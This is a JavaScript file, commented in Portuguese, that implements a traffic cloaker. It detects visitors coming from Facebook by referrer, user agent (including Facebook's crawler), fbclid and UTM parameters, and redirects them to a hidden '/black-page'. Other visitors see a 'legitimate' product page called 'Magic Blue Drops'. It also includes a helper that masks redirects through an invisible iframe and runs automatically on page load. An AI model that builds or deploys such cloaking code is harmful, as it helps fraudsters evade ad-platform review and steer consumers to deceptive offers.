// Sistema de Cloaker - Detecta origem do tráfego
class TrafficCloaker {
    constructor() {
        this.facebookDomains = [
            'facebook.com',
            'fb.com',
            'm.facebook.com',
            'l.facebook.com',
            'lm.facebook.com'
        ];
        
        this.facebookUserAgents = [
            'FacebookExternalHit',
            'facebookexternalhit',
            'Facebot',
            'Facebook'
        ];
        
        this.facebookParams = [
            'fbclid',
            'fb_source',
            'fb_ref',
            'utm_source=facebook',
            'utm_medium=social',
            'utm_campaign'
        ];
    }

    // Verifica se vem do Facebook
    isFromFacebook() {
        return this.checkReferrer() || 
               this.checkUserAgent() || 
               this.checkUrlParams() ||
               this.checkFacebookIP();
    }

    // Verifica referrer
    checkReferrer() {
        const referrer = document.referrer.toLowerCase();
        return this.facebookDomains.some(domain => referrer.includes(domain));
    }

    // Verifica User Agent
    checkUserAgent() {
        const userAgent = navigator.userAgent;
        return this.facebookUserAgents.some(agent => 
            userAgent.includes(agent)
        );
    }

    // Verifica parâmetros da URL
    checkUrlParams() {
        const urlParams = new URLSearchParams(window.location.search);
        const currentUrl = window.location.href.toLowerCase();
        
        // Verifica fbclid
        if (urlParams.has('fbclid')) return true;
        
        // Verifica outros parâmetros do Facebook
        return this.facebookParams.some(param => {
            if (param.includes('=')) {
                return currentUrl.includes(param);
            }
            return urlParams.has(param);
        });
    }

    // Verifica se é IP do Facebook (básico)
    checkFacebookIP() {
        // Esta função seria mais complexa em produção
        // Por agora, verifica alguns indicadores
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const language = navigator.language;
        
        // Lógica adicional pode ser implementada aqui
        return false;
    }

    // Função principal de redirecionamento
    redirect() {
        if (this.isFromFacebook()) {
            // Redireciona para página black
            this.redirectToBlackPage();
        } else {
            // Mantém na página atual (Magic Blue Drops)
            this.showLegitPage();
        }
    }

    // Redireciona para página black
    redirectToBlackPage() {
        // Adiciona delay para parecer natural
        setTimeout(() => {
            window.location.href = '/black-page';
        }, 100);
    }

    // Mostra página legítima
    showLegitPage() {
        // A página atual já é a legítima
        console.log('Visitante normal - mostrando página legítima');
    }

    // Função para mascarar o redirecionamento
    maskRedirect(url) {
        // Cria um iframe invisível primeiro
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = url;
        document.body.appendChild(iframe);
        
        // Depois redireciona
        setTimeout(() => {
            window.location.replace(url);
        }, 200);
    }
}

// Inicializa o cloaker quando a página carrega
document.addEventListener('DOMContentLoaded', function() {
    const cloaker = new TrafficCloaker();
    cloaker.redirect();
});

// Também executa imediatamente para casos onde DOMContentLoaded já passou
if (document.readyState === 'loading') {
    // Ainda carregando
} else {
    const cloaker = new TrafficCloaker();
    cloaker.redirect();
}